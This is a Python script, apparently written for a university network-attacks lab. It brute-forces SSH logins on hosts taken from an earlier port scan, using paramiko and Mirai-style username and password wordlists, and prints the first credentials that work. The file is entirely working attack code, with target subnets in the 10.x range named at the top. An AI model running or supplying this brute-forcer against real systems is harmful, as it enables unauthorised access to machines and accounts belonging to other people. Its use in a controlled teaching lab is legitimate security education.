import paramiko
'''                                                                                                    
Target subnets:                                                                                        
    - 10.12.0.0/24                                                                                     
    - 10.1.0.0/24                                                                                      
                                                                                                       
First 24 bits (3 bytes) are fixed so we are only going to attack 8 bits > 2**8 * 2 ip addresses to test
                                                                                                       
'''                                                                                                    
def read_file_to_list(file_path):                                                                      
    lines = []                                                                                         
    try:                                                                                               
        with open(file_path, 'r') as file:                                                             
            lines = [line.rstrip() for line in file.readlines()]                                       
    except FileNotFoundError:                                                                          
        print(f"Error: File '{file_path}' not found.")                                                 
    except Exception as e:                                                                             
        print(f"An error occurred: {e}")                                                               
                                                                                                       
    return lines                                                                                       
def read_targets():                                                                                    
    file_path = "scan_results.txt"                                                                     
    target_dict = {}                                                                                   
    try:                                                                                               
        with open(file_path, 'r') as file:                                                             
            lines = [line.rstrip() for line in file.readlines()]                                       
            # lines have the following format: <ip addres>:<open port 1>:<open port 2>:...             
            for target in lines:                                                                       
                l = target.split(":")                                                                  
                target_dict[l[0]] = l[1:]
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e: 
        print(f"An error occurred: {e}")

    return target_dict


def ssh_connect(ip_address, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh_client.connect(ip_address, username=username, password=password)
        
        ssh_client.close()
        return 0
    # Uncomment print statements to debug
    except paramiko.AuthenticationException:
        #print("Authentication failed. Please check your credentials.")
        return 1
    except paramiko.SSHException as ssh_err:
        #print("Unable to establish SSH connection:", str(ssh_err))
        return 2
    except Exception as e:
        #print("An error occurred:", str(e))
        return 3

def ssh_brute_force(targets, host_list, pass_list):
    for ip in targets:
        for host in host_list:
            for passwd in pass_list:
                ret = ssh_connect(ip,host, passwd)
                if ret == 0:
                    print(f"For IP address:{ip}")
                    print(f"\t- username: {host}")
                    print(f"\t- password: {passwd}")
                    return 0


if __name__=='__main__':
    users = read_file_to_list("./linfo2347-network-attacks/attacks/wordlists/mirai_users.txt")
    passwords = read_file_to_list("./linfo2347-network-attacks/attacks/wordlists/mirai_passwords.txt")
    targets = read_targets()
    if len(targets) == 0:
        print("Please run network scan attack first, scan_result.txt file is empty ")
        exit(1)
    ssh_targets = []
    for ip, ports in targets.items():
        if "22" in ports:
            ssh_targets.append(ip)
    ssh_brute_force(ssh_targets, users, passwords)

